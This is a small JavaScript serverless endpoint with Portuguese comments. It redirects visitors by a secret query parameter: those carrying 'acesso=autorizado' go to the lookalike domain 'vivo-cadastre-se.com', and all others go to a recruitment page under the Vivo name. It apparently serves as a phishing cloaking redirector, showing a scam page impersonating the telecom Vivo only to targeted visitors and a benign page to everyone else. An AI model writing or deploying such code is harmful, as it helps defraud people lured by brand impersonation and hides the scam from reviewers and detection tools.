// api/redirect.js - Endpoint específico para redirecionamento
import { Pool, neonConfig } from '@neondatabase/serverless';
import ws from 'ws';

// Configure WebSocket para o Neon Database
neonConfig.webSocketConstructor = ws;

// Configuração fixa dos domínios, conforme solicitado pelo usuário
const FIXED_CONFIG = {
  domain: 'vivo-cadastre-se.com',
  alternative_domain: 'atendimentovivo.gupy.io'
};

export default async function handler(req, res) {
  // CORS headers para permitir acesso de qualquer origem
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Verifica se o parâmetro de acesso está presente
  const hasAuthParam = req.query.acesso === 'autorizado';
  console.log('Parâmetro acesso=autorizado presente:', hasAuthParam);

  // SEMPRE utilize a configuração fixa definida acima
  // Determina o domínio alvo baseado na presença do parâmetro de autorização
  const targetDomain = hasAuthParam ? FIXED_CONFIG.domain : FIXED_CONFIG.alternative_domain;
  
  // Constrói a URL de redirecionamento
  const redirectUrl = hasAuthParam 
    ? `https://${targetDomain}?acesso=autorizado` 
    : `https://${targetDomain}`;
  
  console.log('Redirecionando para:', redirectUrl);
  
  // Realiza o redirecionamento
  return res.redirect(307, redirectUrl);
}